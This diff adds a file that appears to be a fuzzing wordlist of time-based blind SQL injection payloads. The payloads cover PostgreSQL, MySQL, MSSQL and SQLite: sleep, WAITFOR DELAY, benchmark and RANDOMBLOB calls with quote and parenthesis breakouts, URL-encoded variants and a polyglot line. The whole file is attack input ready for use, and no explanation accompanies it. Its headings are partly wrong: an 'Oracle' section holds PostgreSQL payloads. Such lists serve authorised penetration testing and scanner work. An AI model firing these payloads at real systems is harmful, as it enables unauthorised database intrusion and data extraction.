@@ -1,0 +1,132 @@
+'pg_sleep(7)--
+"pg_sleep(7)--
+"||pg_sleep(7)--
+'||pg_sleep(7)--
+a'pg_sleep(7)--
+a"pg_sleep(7)--
+a"||pg_sleep(7)--
+a'||pg_sleep(7)--
+#mysql
+- (select*from(select(sleep(7)))a)
+- '%28select%2Afrom%28select%28sleep%287%29%29%29a%29'
+- "1%20OR%20ELT%28%5B33%5D%3D%5B33%5D%2CSLEEP%28%5B7%5D%29%29"
+- "1+AND+ELT%281337%3D1337%2CSLEEP%287%29%29"
+# MSSQL
+- ;waitfor delay '0:0:7'--
+- 'waitfor delay '0:0:7'--
+- '%3Bwaitfor%20delay%20%270%3A0%3A7%27%2D%2D'
+# Oracle
+- 'select%201%20from%20pg%5Fsleep%287%29'
+- '%3B%28select%201%20from%20pg%5Fsleep%287%29%29'
+- '%7C%7C%28select%201%20from%20pg%5Fsleep%287%29%29'
+SLEEP(10)
+'SLEEP(10)--
+"SLEEP(10)--
+'||SLEEP(10)--
+"||SLEEP(10)--
+'OR+SLEEP(10)-- 
+"OR+SLEEP(10)-- 
+'+OR+SLEEP(10)-- 
+"+OR+SLEEP(10)-- 
+'UNION+SELECT+SLEEP(10)--  
+"UNION+SELECT+SLEEP(10)--  
+WAITFOR DELAY '0:0:10'
+'WAITFOR DELAY "0:0:10"-- 
+"WAITFOR DELAY '0:0:10'-- 
+WAITFOR DELAY '0:0:10'
+sleep(5)#
+1 or sleep(5)#
+'||pg_sleep(4)--
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+
